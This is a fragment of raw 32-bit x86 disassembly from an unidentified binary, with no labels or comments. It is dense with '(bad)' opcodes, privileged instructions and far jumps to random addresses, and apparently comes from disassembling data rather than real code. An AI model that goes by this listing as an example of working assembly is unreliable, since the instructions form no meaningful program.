  418423:	jmp    0x39e23f25
  418428:	scas   eax,DWORD PTR es:[edi]
  418429:	sahf   
  41842a:	or     edx,DWORD PTR [eax+0x56]
  41842d:	mov    ecx,0x2247b7d2
  418432:	cmp    ah,bh
  418434:	push   ds
  418435:	out    0xa0,eax
  418437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418438:	mov    bh,0x68
  41843a:	std    
  41843b:	popa   
  41843c:	cld    
  41843d:	xchg   esi,eax
  41843e:	sbb    al,0xc
  418440:	out    0x22,eax
  418442:	(bad)  
  418443:	shl    BYTE PTR [ecx+0x13849252],1
  418449:	mov    cl,0x1e
  41844b:	imul   DWORD PTR [edx-0x6c11ea20]
  418451:	lods   eax,DWORD PTR ds:[esi]
  418452:	jle    0x418482
  418454:	pop    esi
  418455:	ss in  eax,0x2b
  418458:	js     0x41845a
  41845a:	ror    BYTE PTR [ecx+eiz*8],1
  41845d:	fmul   QWORD PTR [eax+0x68]
  418460:	repz rcr BYTE PTR [edx+0x6369c2cb],cl
  418467:	jne    0x4184ba
  418469:	inc    ebp
  41846a:	mov    eax,ds
  41846c:	xor    ebp,DWORD PTR [esi-0x5b9ab1b1]
  418472:	mov    edi,0x3785bdaf
  418477:	xor    ebp,DWORD PTR [ebp+0x14cd1681]
  41847d:	mov    WORD PTR [ebp-0x752edcfc],?
  418483:	cwde   
  418484:	sahf   
  418485:	xchg   ecx,eax
  418486:	stc    
  418487:	cmp    DWORD PTR [ebx+0x52],eax
  41848a:	adc    eax,0x839cbf9e
  41848f:	sbb    BYTE PTR [eax+0x39e7d997],cl
  418495:	js     0x41844e
  418497:	jmp    0x4241:0xe71bddf0
  41849e:	hlt    
  41849f:	ja     0x4184e0
  4184a1:	add    DWORD PTR [ebx+ebp*2-0x5],esi
  4184a5:	mov    ss:0x6b83feb1,al
  4184ab:	pop    eax
  4184ac:	hlt    
  4184ad:	cmp    DWORD PTR [ebx+0x14],edx
  4184b0:	lods   al,BYTE PTR ds:[esi]
  4184b1:	mov    bl,0x48
  4184b3:	fdivr  DWORD PTR [eax+0x43f024a1]
  4184b9:	push   0xaac63cf0
  4184be:	xchg   ebp,eax
  4184bf:	xor    eax,0xfb26a627
  4184c4:	iret   
  4184c5:	stos   DWORD PTR es:[edi],eax
  4184c6:	retf   0x963c
  4184c9:	jge    0x4184a3
  4184cb:	mov    edx,0x99409b61
  4184d0:	jae    0x418484
  4184d2:	adc    DWORD PTR [ebp+0x45fd290d],eax
  4184d8:	inc    edi
  4184d9:	mov    bl,0x6b
  4184db:	pushf  
  4184dc:	mov    ecx,0x703c2da
  4184e1:	inc    edi
  4184e2:	sbb    al,0xf9
  4184e4:	mov    cl,0x1a
  4184e6:	aam    0xbf
  4184e8:	lea    edx,[eax-0x46]
  4184eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ec:	add    eax,0xae318f05
  4184f1:	jo     0x4184b3
  4184f3:	lock add edx,DWORD PTR [esi]
  4184f6:	add    cl,dh
  4184f8:	add    al,0xdc
  4184fa:	les    ebp,FWORD PTR [edi]
  4184fc:	and    eax,0x341bbeb9
  418501:	loop   0x4184f3
  418503:	cmp    eax,0x25add75c
  418508:	xchg   edi,eax
  418509:	jnp    0x418576
  41850b:	jne    0x418535
  41850d:	into   
  41850e:	popf   
  41850f:	mov    al,0x29
  418511:	cs data16 fstp DWORD PTR ds:[ebx]
  418516:	dec    edx
  418517:	mov    esi,ebx
  418519:	fnstsw WORD PTR [ebx]
  41851b:	push   ss
  41851c:	repnz mov ds:0xdd726a9f,eax
  418522:	fsub   QWORD PTR [edx-0x24]
  418525:	add    al,0x5c
  418527:	retf   
  418528:	pop    eax
  418529:	aaa    
  41852a:	lods   eax,DWORD PTR ds:[esi]
  41852b:	pop    ecx
  41852c:	sbb    DWORD PTR [esi-0x7],0x66
  418530:	out    dx,al
  418531:	sbb    esp,DWORD PTR [ecx]
  418533:	pop    edx
  418534:	push   edi
  418535:	shl    BYTE PTR [eax],1
  418537:	xor    ebx,ebp
  418539:	in     al,dx
  41853a:	(bad)  
  41853b:	mov    BYTE PTR [esi+0xa],ch
  41853e:	sub    BYTE PTR [esi+ecx*1+0x5e922407],al
  418545:	aam    0x20
  418547:	or     DWORD PTR [edi-0x4d],esi
  41854a:	hlt    
  41854b:	mov    edi,0xe700422d
  418550:	cs jge 0x4185bb
  418553:	and    eax,0x5b72cdab
  418558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418559:	shl    BYTE PTR [ecx+esi*1],cl
  41855c:	jp     0x418576
  41855e:	jmp    0xe812010f
  418563:	adc    cl,BYTE PTR [edx-0x21]
  418566:	sub    eax,esp
  418568:	mov    ebp,0xf69f8d82
  41856d:	mov    ah,0x39
  41856f:	pop    ss
  418570:	lahf   
  418571:	cmp    al,0x1a
  418573:	test   BYTE PTR [edx],al
  418575:	sbb    al,0x1d
  418577:	xlat   BYTE PTR ds:[ebx]
  418578:	push   0xffffffe2
  41857a:	bound  esi,QWORD PTR [ecx+eax*8+0x78966d1e]
  418581:	nop
  418582:	test   DWORD PTR [esi+0x209fa69e],esi
  418588:	mov    edi,0x151d2bac
  41858d:	sahf   
  41858e:	jns    0x4185d7
  418590:	jmp    0xaf3e:0x725093bc
  418597:	dec    ebx
  418598:	scas   al,BYTE PTR es:[edi]
  418599:	lods   al,BYTE PTR ds:[esi]
  41859a:	pop    ds
  41859b:	push   ds
  41859c:	fstp   QWORD PTR [edx+0x61]
  41859f:	pop    eax
  4185a0:	addr16 jmp 0x986c:0xec5fc2bc
  4185a8:	pop    ds
  4185a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185aa:	inc    ebx
  4185ab:	stc    
  4185ac:	dec    ecx
  4185ad:	outs   dx,DWORD PTR ds:[esi]
  4185ae:	mov    dl,BYTE PTR [esi]
  4185b0:	xchg   bx,ax
  4185b2:	sub    al,BYTE PTR [ecx]
  4185b4:	push   edx
  4185b5:	jg     0x4185d5
  4185b7:	xchg   ebx,eax
  4185b8:	sahf   
  4185b9:	xchg   esi,eax
  4185ba:	inc    edx
  4185bb:	fld    st(1)
  4185bd:	xchg   ebp,eax
  4185be:	dec    eax
  4185bf:	aas    
  4185c0:	and    esi,ecx
  4185c2:	test   DWORD PTR [ebx-0x27],0x7c830cd
  4185c9:	inc    eax
  4185ca:	mov    ds:0x62c9937,al
  4185cf:	cld    
  4185d0:	pop    es
  4185d1:	jmp    DWORD PTR [edx+0x4a]
  4185d4:	shr    edx,1
  4185d6:	push   esi
  4185d7:	jmp    0x9840:0xea5937f
  4185de:	pop    edx
  4185df:	es icebp 
  4185e1:	loope  0x418601
  4185e3:	nop
  4185e4:	mov    ds:0xc193a4cb,eax
  4185e9:	xor    DWORD PTR [esi-0x46],ecx
  4185ec:	aam    0x83
  4185ee:	and    ebp,esi
  4185f0:	nop
  4185f1:	push   edi
  4185f2:	push   ds
  4185f3:	and    DWORD PTR [ebx],ebx
  4185f5:	(bad)
  4185f9:	cmp    DWORD PTR ds:0x648be477,ebp
  4185ff:	mov    ebp,0xde8514e6
  418604:	cmp    eax,0xdc20ee7a
  418609:	aad    0x91
  41860b:	adc    al,BYTE PTR [edi]
  41860d:	push   ebx
  41860e:	or     BYTE PTR [ebx+0x2429f645],ch
  418614:	retf   
  418615:	cmp    ebx,edx
  418617:	sub    esp,DWORD PTR [edx]
  418619:	mov    eax,DWORD PTR [edi]
  41861b:	into   
  41861c:	xlat   BYTE PTR ds:[ebx]
  41861d:	jns    0x418603
  41861f:	pop    ss
  418620:	int    0x78
  418622:	loopne 0x41865f
  418624:	enter  0x1d2d,0xcc
  418628:	jns    0x418626
  41862a:	mov    ch,0xaa
  41862c:	sub    al,0x2b
  41862e:	adc    al,BYTE PTR [ecx+esi*8+0x3ae68bcd]
  418635:	ins    DWORD PTR es:[edi],dx
  418636:	aam    0x3
  418638:	mov    bh,0xa5
  41863a:	jnp    0x418662
  41863c:	jecxz  0x418644
  41863e:	bnd jmp 0x418684
  418641:	add    BYTE PTR [edx-0xf],dh
  418644:	arpl   WORD PTR [edi+0x5a8de0bf],cx
  41864a:	das    
  41864b:	pop    edi
  41864c:	sub    DWORD PTR [edi+0x57],edx
  41864f:	lods   al,BYTE PTR ds:[esi]
  418650:	(bad)  
  418651:	int    0xc8
  418653:	or     ebx,ecx
  418655:	out    0x78,eax
  418657:	ret    0xdbe1
  41865a:	nop
  41865b:	(bad)  
  41865c:	sbb    ah,BYTE PTR [edi-0x7f]
  41865f:	pop    esi
  418660:	popf   
  418661:	sbb    al,0xfc
  418663:	test   BYTE PTR [ebx],bh
  418665:	jge    0x418626
  418667:	cmp    DWORD PTR [ecx-0xf4fe18d],ecx
  41866d:	fnsave [esi]
  41866f:	mov    ebp,0x1f716b0c
  418674:	lds    ebp,FWORD PTR [ebp+0x47d394f3]
  41867a:	jmp    0x418670
  41867c:	inc    ebx
  41867d:	pusha  
  41867e:	xor    DWORD PTR [edx+0x56532e28],ebp
  418684:	push   0x71
  418686:	pop    es
  418687:	fwait
  418688:	push   0x5f
  41868a:	int3   
  41868b:	mov    ebx,DWORD PTR [ebx-0x1fb9726d]
  418691:	mov    al,ds:0x20552b36
  418696:	xor    BYTE PTR [edi-0x757ef51f],bl
  41869c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41869d:	cwde   
  41869e:	sbb    DWORD PTR [ebx],0x769bbc4a
  4186a4:	popf   
  4186a5:	enter  0x7bcc,0x2e
  4186a9:	dec    edx
  4186aa:	sar    BYTE PTR [ecx],1
  4186ac:	xor    eax,0x34d03b0e
  4186b1:	frstor ds:0xa463b35e
  4186b7:	cmp    BYTE PTR [ebx],cl
  4186b9:	xor    DWORD PTR [eax],esp
  4186bb:	sub    eax,0x78803905
  4186c0:	mov    ch,0x78
  4186c2:	jno    0x41864f
  4186c4:	mov    edx,0x5e4f2cec
  4186c9:	scas   al,BYTE PTR es:[edi]
  4186ca:	mov    ds:0xb1b28dfa,eax
  4186cf:	cld    
  4186d0:	out    0xb1,eax
  4186d2:	and    ebp,ebx
  4186d4:	and    ah,BYTE PTR [edi]
  4186d6:	cmp    ah,BYTE PTR [edi]
  4186d8:	(bad)  
  4186d9:	idiv   ebx
  4186db:	fmul   DWORD PTR [eax]
  4186dd:	push   eax
  4186de:	in     eax,0x4
  4186e0:	and    DWORD PTR [ecx+ebx*2-0x307c2d71],ebp
  4186e7:	out    0xf1,eax
  4186e9:	sub    eax,0xc2211737
  4186ee:	sub    ecx,DWORD PTR [edi-0x6a633588]
  4186f4:	cli    
  4186f5:	dec    ebx
  4186f6:	push   ebp
  4186f7:	retf   0x2b85
  4186fa:	ins    BYTE PTR es:[edi],dx
  4186fb:	cwde   
  4186fc:	and    DWORD PTR [edx],0xffffffeb
  4186ff:	sbb    DWORD PTR [edi],0x43646dfb
  418705:	sbb    al,0x10
  418707:	push   ss
  418708:	stc    
  418709:	push   es
  41870a:	jl     0x41877d
  41870c:	or     al,0xfe
  41870e:	mov    cl,0x14
  418710:	cmp    al,BYTE PTR ds:0x2073383
  418716:	addr16 mov edi,0x1a730c10
  41871c:	mov    cl,0x45
  41871e:	loopne 0x4186af
  418720:	test   DWORD PTR [ebp+0x41fb291e],ecx
  418726:	mov    esp,0xb1812f4b
  41872b:	es repnz sub al,bh
  41872f:	or     edx,ecx
  418731:	int    0xad
  418733:	lods   al,BYTE PTR ds:[esi]
  418734:	pop    eax
  418735:	jbe    0x418711
  418737:	push   0x1c
  418739:	test   esi,esp
  41873b:	and    eax,0x209b0d5a
  418740:	retf   0x12ef
  418743:	adc    al,0xb1
  418745:	jae    0x41877f
  418747:	cmp    dh,bh
  418749:	cld    
  41874a:	sub    eax,edi
  41874c:	call   FWORD PTR [edx-0x10]
  41874f:	out    dx,al
  418750:	cs ins DWORD PTR es:[edi],dx
  418752:	call   0x6c3f:0xa9a2fbad
  418759:	dec    esi
  41875a:	loop   0x41872f
  41875c:	mov    ecx,0xfe1f7fc2
  418761:	push   ds
  418762:	inc    esi
  418763:	out    dx,al
  418764:	aas    
  418765:	mov    ch,0xe
  418767:	daa    
  418768:	sbb    al,0x4b
  41876a:	dec    esi
  41876b:	cmp    ah,dh
  41876d:	jg     0x4187e5
  41876f:	es push eax
  418771:	dec    esp
  418772:	pop    ss
  418773:	jb     0x4187e3
  418775:	push   0xb
  418777:	imul   eax,DWORD PTR [eax-0x6a],0x2143119a
  41877e:	inc    esp
  41877f:	sbb    DWORD PTR [ebx],edi
  418781:	mov    edx,0x4c3a1442
  418786:	rcl    BYTE PTR [ebp-0x4f133605],1
  41878c:	test   eax,0xc4cfc834
  418791:	and    ecx,DWORD PTR [esi+0x5c3f3522]
  418797:	into   
  418798:	dec    eax
  418799:	sbb    eax,0x92d2b0a1
  41879e:	pop    edi
  41879f:	pop    eax
  4187a0:	(bad)  
  4187a2:	loopne 0x418743
  4187a4:	xchg   BYTE PTR [edx],ch
  4187a6:	pusha  
  4187a7:	mov    edi,0x2c3f8b9
  4187ac:	sbb    esp,ebx
  4187ae:	test   ah,bh
  4187b0:	jnp    0x41875c
  4187b2:	xor    DWORD PTR [edi],0x7d
  4187b5:	ss imul ebx,edx,0xffffffb9
  4187b9:	cmp    ecx,edi
  4187bb:	and    ch,BYTE PTR [ebp-0x1e]
  4187be:	xchg   esi,eax
  4187bf:	sbb    eax,0x39de03d7
  4187c4:	jge    0x4187a0
  4187c6:	aaa    
  4187c7:	sbb    dh,BYTE PTR [esi]
  4187c9:	dec    eax
  4187ca:	fidiv  DWORD PTR [eax]
  4187cc:	mov    WORD PTR [edi],ds
  4187ce:	(bad)  
  4187d0:	mov    eax,?
  4187d2:	pop    esi
  4187d3:	and    cl,BYTE PTR [edx]
  4187d5:	fstp   DWORD PTR [edx-0x66]
  4187d8:	pop    esp
  4187d9:	add    BYTE PTR [edx],ah
  4187db:	inc    esp
  4187dc:	stc    
  4187dd:	cdq    
  4187de:	inc    esp
  4187df:	xor    cl,BYTE PTR [ecx+0x2]
  4187e2:	test   eax,0x6ef423eb
  4187e7:	arpl   WORD PTR [ebp-0xfa8a279],bx
  4187ed:	clc    
  4187ee:	sub    dl,BYTE PTR [ecx-0x71]
  4187f1:	jb     0x418820
  4187f3:	cmp    eax,0xba56086c
  4187f8:	mov    ch,0x91
  4187fa:	fs aaa 
  4187fc:	(bad)  
  4187fd:	cmp    BYTE PTR [ebx+0x4020034a],cl
  418803:	mov    bh,0xd4
  418805:	ret    
  418806:	les    esi,FWORD PTR [ecx]
  418808:	je     0x418823
  41880a:	inc    edi
  41880b:	push   0x558e4ade
  418810:	hlt    
  418811:	push   ss
  418812:	xchg   edi,eax
  418813:	loope  0x418807
  418815:	popf   
  418816:	push   eax
  418817:	mov    bh,0xd3
  418819:	sbb    al,0xe6
  41881b:	jl     0x41881a
  41881d:	cmc    
  41881e:	call   FWORD PTR [ebp+0x47]
  418821:	fs out 0xd6,eax
  418824:	cld    
  418825:	cmc    
  418826:	jno    0x41889a
  418828:	cmc    
  418829:	sbb    al,0x55
  41882b:	xor    dl,bl
  41882d:	cmp    dh,BYTE PTR [edx+edx*8+0x63]
  418831:	mov    ds:0x598c4064,al
  418836:	aas    
  418837:	and    edx,DWORD PTR [ebp+0x7dc14b21]
  41883d:	je     0x41885e
  41883f:	test   BYTE PTR [ebx+0x43c309a7],bh
  418845:	imul   eax,DWORD PTR [ebp+0x28],0x11
  418849:	xchg   ebx,eax
  41884a:	cmp    BYTE PTR [edx+0x3b44354b],ah
  418850:	mov    esp,eax
  418852:	pusha  
  418853:	out    0x1,al
  418855:	add    al,BYTE PTR [edi+ebp*1-0x20]
  418859:	xor    al,0x52
  41885b:	repnz mov edx,DWORD PTR [eax]
  41885e:	sahf   
  41885f:	jbe    0x4188c6
  418861:	cmp    BYTE PTR [eax-0x3d],dh
  418864:	or     dh,BYTE PTR ds:0x9a63eba1
  41886a:	xor    eax,0xea8688b3
  41886f:	mov    ds:0x4e07db90,eax
  418874:	and    BYTE PTR [ecx-0x4191848],bh
  41887a:	(bad)  
  41887b:	popa   
  41887c:	mov    dh,0x7b
  41887e:	inc    edi
  41887f:	xchg   ebp,eax
  418880:	jmp    0xcb509484
  418885:	or     DWORD PTR [ebx+0x22778e58],esi
  41888b:	cmp    DWORD PTR [edx-0x422d4870],edx
  418891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418892:	ja     0x418854
  418894:	mov    ebx,?
  418896:	ficom  WORD PTR [edx-0x28e8fce7]
  41889c:	adc    dh,BYTE PTR [ebx]
  41889e:	outs   dx,DWORD PTR ds:[esi]
  41889f:	outs   dx,BYTE PTR ds:[esi]
  4188a0:	or     esp,ebx
  4188a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a3:	repz and DWORD PTR [eax-0x32],eax
  4188a7:	mov    DWORD PTR [eax+0x7ff4cb67],ebp
  4188ad:	cs inc edi
  4188af:	mov    ebx,0xc89cf931
  4188b4:	xchg   dh,ah
  4188b6:	retf   
  4188b7:	cmp    eax,DWORD PTR [esi]
  4188b9:	adc    DWORD PTR [ecx],0xffffffdf
  4188bc:	jg     0x418863
  4188be:	xchg   ebp,eax
  4188bf:	mov    esp,0x788a73f
  4188c4:	xor    ecx,esi
  4188c6:	fnstenv [ecx-0x6e]
  4188c9:	pop    edi
  4188ca:	sub    BYTE PTR [ebp+0x283261ed],ch
  4188d0:	xor    dh,BYTE PTR [eax-0x24]
  4188d3:	push   0x2023ded1
  4188d8:	xchg   ecx,eax
  4188d9:	pop    ebp
  4188da:	or     edi,eax
  4188dc:	cmc    
  4188dd:	mov    eax,0x9eabaeef
  4188e2:	sahf   
  4188e3:	aaa    
  4188e4:	push   esp
  4188e5:	mov    cl,0x62
  4188e7:	cmp    DWORD PTR [edx+ecx*4-0x3f],esi
  4188eb:	jne    0x418950
  4188ed:	mov    edx,0x761c7412
  4188f2:	mov    al,ds:0x61d47314
  4188f7:	cmp    eax,0xbf46acd6
  4188fc:	push   0xffffff83
  4188fe:	push   esi
  4188ff:	xor    edx,esi
  418901:	shl    ch,1
  418903:	xlat   BYTE PTR ds:[ebx]
  418904:	fsubr  st(2),st
  418906:	mov    ds:0x12e4bccd,al
  41890b:	mov    edx,0xfe2ddc02
  418910:	shr    DWORD PTR [ecx-0x61],1
  418913:	sti    
  418914:	lea    ebx,[ebp+0x63]
  418917:	push   0xffffff80
  418919:	xor    DWORD PTR [edx+edx*4],0xffffff92
  41891d:	or     edi,esp
  41891f:	lea    edi,[ebx+eiz*8-0x73]
  418923:	outs   dx,BYTE PTR ds:[esi]
  418924:	jmp    FWORD PTR [ecx+0x6]
  418927:	(bad)  
  418928:	and    ah,bl
  41892a:	loope  0x4188e9
  41892c:	mov    edx,0x65cf8e55
  418931:	hlt    
  418932:	jl     0x41895c
  418934:	lahf   
  418935:	in     eax,0x2b
  418937:	shl    edx,cl
  418939:	(bad)  
  41893b:	stc    
  41893c:	push   0x63993a40
  418941:	lds    ebx,FWORD PTR [eax-0x5]
  418944:	mov    bh,0x8e
  418946:	ja     0x4188ed
  418948:	nop
  418949:	sub    eax,0x97ea48f6
  41894e:	xor    eax,0x55088df7
  418953:	xor    ax,0x308b
  418957:	jecxz  0x4188e5
  418959:	and    ah,BYTE PTR [ecx+esi*2-0x647d591f]
  418960:	dec    ecx
  418961:	adc    BYTE PTR [edx+ebp*4],dh
  418964:	mov    dh,0x24
  418966:	push   eax
  418967:	mov    edx,0x75f7d50a
  41896c:	scas   al,BYTE PTR es:[edi]
  41896d:	out    0xdb,al
  41896f:	jle    0x4188fa
  418971:	xchg   ecx,eax
  418972:	pop    esi
  418973:	addr16 int 0x2a
  418976:	mov    dh,0xee
  418978:	test   DWORD PTR [esi-0x18556189],edi
  41897e:	dec    edx
  41897f:	inc    ecx
  418980:	cmp    ebx,eax
  418982:	fistp  DWORD PTR [eax-0x3e]
  418985:	mov    al,ds:0xb2c2fa4c
  41898a:	inc    edx
  41898b:	sub    eax,0xf8326859
  418990:	rcl    DWORD PTR [ebp+0x1c194faf],1
  418996:	pop    esp
  418997:	stos   DWORD PTR es:[edi],eax
  418998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418999:	inc    ebp
  41899a:	scas   al,BYTE PTR es:[edi]
  41899b:	xor    al,0xff
  41899d:	add    BYTE PTR [ebx+0x36],0x52
  4189a1:	neg    BYTE PTR [edi]
  4189a3:	rcr    DWORD PTR gs:[esi+0x47],cl
  4189a7:	ss and eax,0x7987be60
  4189ad:	mov    ch,0x25
  4189af:	mov    al,0xb1
  4189b1:	pop    ebp
  4189b2:	cmp    BYTE PTR [ebp+0x7d],dl
  4189b5:	ds jns 0x41896f
  4189b8:	ror    ah,0xb1
  4189bb:	arpl   sp,cx
  4189bd:	scas   eax,DWORD PTR es:[edi]
  4189be:	cmp    BYTE PTR [esi+0x726e76ad],bl
  4189c4:	mov    dl,0x28
  4189c6:	or     cl,BYTE PTR ds:0x6372549a
  4189cc:	dec    ebp
  4189cd:	xor    ah,BYTE PTR [edi]
  4189cf:	(bad)  
  4189d0:	aas    
  4189d1:	aam    0xc8
  4189d3:	lea    ecx,[esi+0x4b00c3eb]
  4189d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189da:	mov    eax,ds:0x1beda8cd
  4189df:	aas    
  4189e0:	fstp   TBYTE PTR [edi-0x5b7a1a26]
  4189e6:	sbb    BYTE PTR ds:0xadd36841,ch
  4189ec:	sub    eax,0xfc58c1da
  4189f1:	sbb    edx,0x45f47b50
  4189f7:	(bad)  
  4189f8:	and    ebp,ebp
  4189fa:	add    BYTE PTR [eax+edi*8-0x1d59824c],cl
  418a01:	call   0x2547de03
  418a06:	or     al,0x7f
  418a08:	xchg   edi,eax
  418a09:	push   eax
  418a0a:	sahf   
  418a0b:	adc    dh,BYTE PTR [edx-0x4f]
  418a0e:	ret    
  418a0f:	sbb    eax,0xf4a6355d
  418a14:	fist   DWORD PTR [ebx]
  418a16:	cli    
  418a17:	dec    esp
  418a18:	sub    dh,BYTE PTR [esi+0x2]
  418a1b:	dec    ecx
  418a1c:	push   es
  418a1d:	(bad)  [ecx+0x5317fdf]
  418a23:	les    edi,FWORD PTR [eax-0x72]
  418a26:	(bad)  
  418a27:	jecxz  0x418a19
  418a29:	or     BYTE PTR [esi+0x2c],bh
  418a2c:	xchg   BYTE PTR [edi-0x1e],cl
  418a2f:	lea    ecx,[ebx+0x3a]
  418a32:	jle    0x418a38
  418a34:	sub    eax,0x8054e797
  418a39:	mov    ?,WORD PTR [eax+ebp*2]
  418a3c:	dec    edx
  418a3d:	xchg   edi,eax
  418a3e:	xchg   esp,eax
  418a3f:	pop    ss
  418a40:	enter  0xbfda,0x50
  418a44:	jnp    0x4189e3
  418a46:	adc    al,0xf7
  418a48:	mov    edi,0x8c6bba99
  418a4d:	ret    
  418a4e:	mov    bh,0x5f
  418a50:	jb     0x418a3e
  418a52:	dec    ecx
  418a53:	sub    DWORD PTR [edx+0x6235d66d],esp
  418a59:	sbb    al,0x41
  418a5b:	push   es
  418a5c:	mov    ch,0x52
  418a5e:	and    DWORD PTR [esi+0x15],0x4f
  418a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a63:	repz adc esi,DWORD PTR [edx]
  418a66:	jne    0x4189eb
  418a68:	loopne 0x418a79
  418a6a:	ss test al,0x14
  418a6d:	mov    ah,0xde
  418a6f:	aaa    
  418a70:	out    dx,eax
  418a71:	inc    ecx
  418a72:	dec    ebx
  418a73:	jl     0x418a15
  418a75:	daa    
  418a76:	push   ecx
  418a77:	push   0x18a33b9c
  418a7c:	mov    eax,0xf60e19c3
  418a81:	add    DWORD PTR [ebx-0x71],ebx
  418a84:	mov    ecx,0x39e08431
  418a89:	cmp    al,0x36
  418a8b:	sahf   
  418a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8d:	scas   eax,DWORD PTR es:[edi]
  418a8e:	or     BYTE PTR [edx-0x1b0d7f02],dl
  418a94:	xchg   edi,eax
  418a95:	cmp    BYTE PTR [edi+0x4c971c78],bh
  418a9b:	inc    ebx
  418a9c:	(bad)  
  418a9d:	sbb    DWORD PTR [edi],ebp
  418a9f:	inc    edi
  418aa0:	(bad)  
  418aa1:	pop    eax
  418aa2:	or     edx,DWORD PTR [esi-0x501dba45]
  418aa8:	push   edx
  418aa9:	or     esi,esp
  418aab:	sub    eax,0x41c4242c
  418ab0:	mov    WORD PTR [ebp-0x16],es
  418ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ab4:	ss mov edi,esp
  418ab7:	shl    BYTE PTR [eax+0x38d12d73],cl
  418abd:	jbe    0x418ad2
  418abf:	pushf  
  418ac0:	or     DWORD PTR [esi+0x16],esi
  418ac3:	fsqrt  
  418ac5:	push   edx
  418ac6:	add    dh,BYTE PTR [ebx-0x3e]
  418ac9:	sbb    al,0x5a
  418acb:	sahf   
  418acc:	int    0x29
  418ace:	push   eax
  418acf:	sbb    al,dl
  418ad1:	sub    cl,BYTE PTR [edx]
  418ad3:	pop    esp
  418ad4:	fucomip st,st(7)
  418ad6:	(bad)  
  418ad7:	iret   
  418ad8:	loop   0x418b38
  418ada:	mov    ds:0x69e03637,al
  418adf:	add    ah,BYTE PTR [esi+ecx*8-0x68]
  418ae3:	xchg   DWORD PTR [ebp+0x490f7e18],ebp
  418ae9:	xchg   ecx,eax
  418aea:	jnp    0x418b4f
  418aec:	push   eax
  418aed:	add    eax,0xc06f5a5f
  418af2:	ret    
  418af3:	retf   
  418af4:	adc    bl,bh
  418af6:	jmp    0x9478:0x45ebdb4
  418afd:	adc    al,0xe2
  418aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b00:	jecxz  0x418ae8
  418b02:	add    DWORD PTR [ebp+0x5b],edi
  418b05:	xor    cl,BYTE PTR [esi]
  418b07:	add    BYTE PTR [esi+0x3a6ebec5],ch
  418b0d:	pop    ss
  418b0e:	iret   
  418b0f:	xchg   DWORD PTR [edx-0x89a2567],eax
  418b15:	or     bh,BYTE PTR [bx+si+0x60a1]
  418b1a:	nop
  418b1b:	sti    
  418b1c:	xor    bh,BYTE PTR [ebp-0x7a21ad01]
  418b22:	scas   eax,DWORD PTR es:[edi]
  418b23:	mov    dh,BYTE PTR [bx-0x394e]
  418b28:	data16 (bad) 
  418b2a:	push   esp
  418b2b:	and    BYTE PTR ds:0xfd8aeb5f,al
  418b31:	push   edx
  418b32:	aam    0x98
  418b34:	and    DWORD PTR [edx-0x6bb3a74f],0xffffffd3
  418b3b:	xchg   DWORD PTR [esi-0x3575738b],esi
  418b41:	ror    BYTE PTR [esi],cl
  418b43:	(bad)  
  418b44:	jl     0x418ade
  418b46:	in     al,dx
  418b47:	imul   ebx,DWORD PTR [esi-0x46],0x2d69de94
  418b4e:	call   0xeb0a8804
  418b53:	push   ebp
  418b54:	sbb    al,0xa1
  418b56:	pop    eax
  418b57:	lods   al,BYTE PTR ds:[esi]
  418b58:	or     DWORD PTR [edx+0x330b89f8],ebp
  418b5e:	inc    esi
  418b5f:	arpl   WORD PTR [ebx-0x71],cx
  418b62:	dec    esp
  418b63:	pop    ebx
  418b64:	loope  0x418b08
  418b66:	jmp    0x2299:0x4523ea8c
  418b6d:	sub    eax,0x958f3352
  418b72:	stos   BYTE PTR es:[edi],al
  418b73:	xor    BYTE PTR [ecx],dh
  418b75:	scas   al,BYTE PTR es:[edi]
  418b76:	loopne 0x418b94
  418b78:	outs   dx,BYTE PTR ds:[esi]
  418b79:	pop    edi
  418b7a:	inc    esi
  418b7b:	inc    edx
  418b7c:	aas    
  418b7d:	out    0xe0,al
  418b7f:	data16 (bad) [ebp-0x367b5f9a]
  418b86:	inc    edx
  418b87:	(bad)  
  418b89:	pusha  
  418b8a:	mul    DWORD PTR [ebp+ecx*4-0x3d]
  418b8e:	out    dx,eax
  418b8f:	push   ebp
  418b90:	test   eax,0x2347e3c8
  418b95:	sbb    DWORD PTR [edx-0x68],edx
  418b98:	out    dx,eax
  418b99:	xchg   ecx,eax
  418b9a:	arpl   bx,dx
  418b9c:	lods   eax,DWORD PTR ds:[esi]
  418b9d:	cmp    al,0xf9
  418b9f:	ret    0xfd55
  418ba2:	dec    ebp
  418ba3:	sbb    eax,0x180e7723
  418ba8:	adc    bh,BYTE PTR [edx]
  418baa:	outs   dx,BYTE PTR ds:[esi]
  418bab:	jmp    0xc4f9fd0e
  418bb0:	js     0x418bab
  418bb2:	inc    eax
  418bb3:	stos   BYTE PTR es:[edi],al
  418bb4:	xchg   edi,eax
  418bb5:	sub    al,0x1e
  418bb7:	loope  0x418b44
  418bb9:	jno    0x418ba6
  418bbb:	mov    ah,0x2b
  418bbd:	and    si,WORD PTR [ebp-0x1a]
  418bc1:	xchg   DWORD PTR [ebp-0x1ca26dcb],ebp
  418bc7:	inc    esi
  418bc8:	jns    0x418c02
  418bca:	dec    edx
  418bcb:	scas   al,BYTE PTR es:[edi]
  418bcc:	nop
  418bcd:	jns    0x418bdb
  418bcf:	cmc    
  418bd0:	jne    0x418b62
  418bd2:	popa   
  418bd3:	nop
  418bd4:	fwait
  418bd5:	push   ss
  418bd6:	mov    cl,0xa0
  418bd8:	or     ecx,DWORD PTR [edx]
  418bda:	icebp  
  418bdb:	inc    edi
  418bdc:	and    eax,0x26e10bc0
  418be1:	mov    BYTE PTR [esi+0x559192f],bl
  418be7:	push   ebp
  418be8:	cmp    bh,bl
  418bea:	adc    al,BYTE PTR [esi-0x28]
  418bed:	push   esp
  418bee:	sbb    edx,DWORD PTR [ecx]
  418bf0:	lods   al,BYTE PTR ss:[esi]
  418bf2:	or     al,0x1a
